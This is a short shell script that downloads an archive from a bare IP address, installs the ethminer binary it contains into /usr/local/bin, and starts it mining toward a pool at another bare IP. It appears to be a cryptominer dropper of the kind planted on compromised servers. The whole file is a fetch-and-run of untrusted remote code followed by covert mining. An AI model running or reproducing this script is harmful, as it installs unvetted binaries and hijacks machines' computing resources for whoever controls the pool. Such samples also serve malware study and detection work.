#!/bin/sh
apt-get install wget; sudo apt-get update -y; sudo apt-get install -y tar; mkdir down; cd down; wget http://159.89.237.64/test.gz; tar -zxvf test.gz; cd bin; install -sv ethminer /usr/local/bin/; ./ethminer --farm-recheck 200 -U -F  http://143.198.11.202:8080/aaaaaaa
